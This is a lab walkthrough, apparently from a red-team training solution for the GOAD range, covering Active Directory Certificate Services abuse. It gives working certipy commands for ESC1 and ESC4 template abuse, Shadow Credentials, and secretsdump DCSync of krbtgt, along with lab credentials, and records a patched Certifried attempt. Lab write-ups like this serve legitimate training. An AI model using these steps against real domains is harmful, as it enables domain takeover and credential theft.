# GOAD Part 6 - ADCS (redStackPRO)

Reference: [mayfly - GOAD part 6](https://mayfly277.github.io/posts/GOADv2-pwning-part6/).
AD CS abuse: find a certificate template the attacker can bend, enroll as a
privileged principal, and authenticate with the certificate. Which template, on
which CA, depends on the lab.

> **Status legend:** ✅ PASS · ❌ blocked · ⏳ not run · ➖ N/A.

## Target surface (full GOAD: essos)
<!-- lab-requires: meereen -->

On full GOAD this part attacks the **essos.local** forest - CA `ESSOS-CA` on
**braavos** (`192.168.56.23`), essos DC **meereen** (`192.168.56.12`) - driven
with **certipy-ad 5.x** as `khal.drogo@essos.local:horse`, run **through the hodor
beacon's SOCKS proxy** (every certipy call below is `proxychains -q certipy …`;
the DCs are internal, reachable only over the beacon's SOCKS - see
[part 1](part-01-recon.md) Step 1 for the proxy setup and
[methodology](../goad/README.md#methodology)).

**GOAD-Light has none of this** - no essos forest, so no braavos, meereen or
khal.drogo. It ships an ESC1 in sevenkingdoms instead; see
[the goad-light copy of this part](../goad-light/part-06-adcs.md).

## ESC1 on SEVENKINGDOMS-CA
<!-- lab-only: goad-light, goad-mini -->

GOAD-Light ships a clean **ESC1** in the **sevenkingdoms** forest, verified live
on a real range. Drive it with **certipy** through the beacon's
SOCKS proxy, the same way the full GOAD page does (see
[part 1](part-01-recon.md) Step 1 for the proxy setup):

- **CA:** `SEVENKINGDOMS-CA` on `kingslanding.sevenkingdoms.local`.
- **Vulnerable template:** `RSPESC1` - `ENROLLEE_SUPPLIES_SUBJECT` set with a
  Client Authentication EKU (`1.3.6.1.5.5.7.3.2`) and low-priv enrollment: the
  textbook ESC1. It is **published** on SEVENKINGDOMS-CA.
- **The attack:** as any sevenkingdoms Domain User, `certipy req -ca
  SEVENKINGDOMS-CA -template RSPESC1 -upn administrator@sevenkingdoms.local -sid
  <admin SID>`, then `certipy auth` for the administrator TGT/NT hash, then
  DCSync kingslanding. The `-sid` is required for the KB5014754 strong-mapping
  reason described in the full GOAD page's Step 2.2.

So GOAD-Light still gives a complete ADCS to Domain Admin story; it runs against
SEVENKINGDOMS-CA/kingslanding with ESC1 rather than essos ESC4.

## Headline result (full GOAD / essos)
<!-- lab-requires: meereen -->

**Domain Admin on essos.local achieved via ESC4.** Two clean wins; the
CVE-based paths are patched (same story as Parts 4-5). ESC1/2/3 are now planted
on the essos CA (see the last table row and Step 1), but were added after the
live run below and are not yet enumerated here.

| Technique | Result | Note |
|-----------|--------|------|
| ESC4 (template write → ESC1) | ✅ **DA + DCSync** | needs `-sid` on the patched DC |
| Shadow Credentials | ✅ NT hash of target | not patch-dependent |
| Certifried (CVE-2022-26923) | ❌ patched | `dNSHostName` constraint violation |
| ESC6 | ❌ | CA flag set but "does not work after May 2022" |
| ESC8 | ⏳ not yet run live | Web Enrollment installed on ESSOS-CA |
| ESC11 | ⏳ | flagged (relay-based), not exploited |
| ESC1 / ESC2 / ESC3 | ⏳ not yet run live | now planted on ESSOS-CA (the CA plants the whole essos forest esc set); the Step 1 enumeration below predates their addition |

## Step 1 - Enumerate the CA + templates
<!-- lab-requires: meereen -->

- [x] Enumerate the CA and its templates:
  ```bash
  certipy find -u khal.drogo@essos.local -p horse -dc-ip 192.168.56.12 -vulnerable -stdout
  ```
  `✅` Found **ESSOS-CA** (Web Enrollment disabled; SAN
  enabled; Request Disposition Issue), vulnerable to **ESC6** ("does not work
  after May 2022") and **ESC11**; template **ESC4** where `khal.drogo` has Full
  Control. Template set at the time of this run: ESC4 + **ESC13**. (The essos CA
  now also plants ESC1/2/3 from the forest esc set; this enumeration predates
  that change, so a re-run is needed to confirm the current template set.)

## Step 2 - ESC4 → Domain Admin (the win)
<!-- lab-requires: meereen -->

khal.drogo can rewrite the ESC4 template, so make it ESC1-vulnerable, enroll as
`administrator`, and DCSync.

- [x] **2.1** rewrite ESC4 to be vulnerable, keeping the old config:
  ```bash
  certipy template -template ESC4 -save-old
  ```
  `✅`
- [x] **2.2** `certipy req … -template ESC4 -ca ESSOS-CA -upn
  administrator@essos.local -sid <admin SID>`. `✅` - **the `-sid` is required**:
  without it, auth fails `Object SID mismatch` (KB5014754, May-2022 strong
  certificate mapping). With the SID embedded, the cert strongly maps.
- [x] **2.3** `certipy auth -pfx administrator.pfx` → **administrator TGT + NT
  hash**. `✅`
- [x] **2.4** rollback: `certipy template … -configuration ESC4.json`. `✅`
- [x] **2.5** `secretsdump -k -no-pass ESSOS.LOCAL/administrator@meereen…` →
  **DCSync essos krbtgt**. `✅` Domain compromised.

> **redStack adaptation vs mayfly:** mayfly (2022) enrolled with just `-upn`.
> Our DCs enforce the May-2022 strong mapping, so the redStack step adds
> **`-sid <target SID>`** (grab it with `lookupsid.py`). This is the modern,
> still-working form of the attack.

## Step 3 - Shadow Credentials
<!-- lab-requires: meereen -->

- [x] `certipy shadow auto -u khal.drogo@essos.local -p horse -account
  viserys.targaryen`. `✅` - khal.drogo has write on viserys's
  `msDS-KeyCredentialLink`; added a Key Credential → PKINIT → **viserys NT hash**,
  then auto-restored the old credentials. Not patch-dependent.

## Step 4 - Certifried (CVE-2022-26923)
<!-- lab-requires: meereen -->

- [ ] `certipy account create … -dns meereen.essos.local`. **❌ patched.** The DC
  rejects the spoofed `dNSHostName` with `constraintViolation 0000200B
  CONSTRAINT_ATT_TYPE (dNSHostName)` (May-2022 validation), so the confusion
  never sets up. Same patch class as noPac (Part 5). `❌ PATCHED`

> **Document-only, by decision.** Certifried is a code-path CVE (a DC-side
> dNSHostName validation fix), not a misconfiguration, so no toggle re-opens it - only an unpatched image would. redStackPRO keeps it documented rather than
> shipping that image, because it is a redundant route to a certificate-based
> takeover the solution already lands twice on essos: **ESC4 → DA** and **Shadow
> Credentials** (both above). The opt-in unpatched-image path is available if live
> Certifried is specifically needed. See Part 5's *noPac - why it stays documented*
> for the full rationale.

## Summary (full GOAD / essos)
<!-- lab-requires: meereen -->

Part 6 passes on the misconfiguration paths. ESC4 gives full Domain Admin on
essos.local (DCSync of krbtgt) using the modern `-sid` technique, and Shadow
Credentials yields a target's NT hash. The CVE-based path (Certifried) is
patched. Unlike the 2021/2022 CVEs, the ESC template misconfigurations are
config, not patch level, so they land cleanly.
